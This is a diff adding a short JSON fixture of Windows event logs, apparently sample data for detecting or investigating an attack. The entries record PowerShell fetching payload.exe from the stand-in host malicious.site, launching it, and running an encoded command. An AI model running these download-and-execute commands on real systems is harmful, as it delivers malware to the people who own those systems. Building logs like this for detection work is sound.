@@ -1,1 +1,8 @@
+[
+  { "TimeCreated": "2026-09-07T13:00:00", "Id": 4624, "Message": "Successful login for user diana" },
+  { "TimeCreated": "2026-09-07T13:01:00", "Id": 4104, "Message": "PowerShell ScriptBlock: Invoke-WebRequest http://malicious.site/payload.exe" },
+  { "TimeCreated": "2026-09-07T13:01:05", "Id": 4104, "Message": "PowerShell ScriptBlock: Start-Process payload.exe" },
+  { "TimeCreated": "2026-09-07T13:02:00", "Id": 4104, "Message": "PowerShell ScriptBlock: powershell.exe -enc UwBFAEMAUgBFAFQAUwA=" },
+  { "TimeCreated": "2026-09-07T13:03:00", "Id": 4688, "Message": "Process created: payload.exe" }
+]
 
